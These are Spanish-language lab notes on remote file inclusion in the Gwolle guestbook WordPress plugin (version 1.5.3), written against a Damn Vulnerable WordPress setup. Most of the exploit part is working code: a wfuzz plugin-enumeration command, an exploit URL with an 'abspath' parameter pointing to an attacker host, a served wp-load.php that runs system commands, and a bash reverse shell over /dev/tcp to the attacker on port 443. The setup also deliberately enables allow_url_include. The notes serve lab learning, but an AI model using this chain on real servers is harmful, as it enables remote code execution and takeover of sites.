> Ejecucion remota de archivo ocurren cuando la aplicación permite que un usuario malintencionado incluya archivos de un servidor remoto en el código ejecutado por el servidor web de la víctima.

## Caso practico
- [[Damn Vulnerable WordPress]]

## Resolucion
- Una vez montado el laboratorio debemos descargar la version 1.5.3 de gwollen
- Gwollen es un plugin para wordpress
- Dentro de la pagina de wordpress agregamos el plugin y debemos modificar dentro del contenedor los permisos de la carpeta `wp-content`
```
chwon www-data:www-data -R wp-content/
```
- Dentro del contenedor donde corre el wordpress agregamos esta linea a `php.ini`
```
allow_url_include="on"
```
- y reiniciamos el contenedor
```
docker restart nombre_del_contenedor
```
## Reconocimiento de la vulnerabilidad
- Con [[wfuzz]]
```
wfuzz -c --hc=404 -t 200 -w /SecList/Discover/Web-Content/CMS/wp-plugin.fuzz.txt http://31337/FUZZ
```
- `-c` con colores
- `--hc=` esconde los 404
- `-t` cantidad de hilos
- `-w` el diccionario

## Codigo vulnerable
```
http://31337/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip-atacante
```

- En tu maquina
```
python3 -m http.server 80
```
- Me va a querer leer un archivo `wp-load.php`, entonces lo creamos
```
<?php 
	echo system('whoami')
?>
```
- Podemos hacer un reverse shell directamente
```
<?php
	system('bash -c "bash -i >& /dev/tcp/ip-atacante/443 0>&1"')
?>
```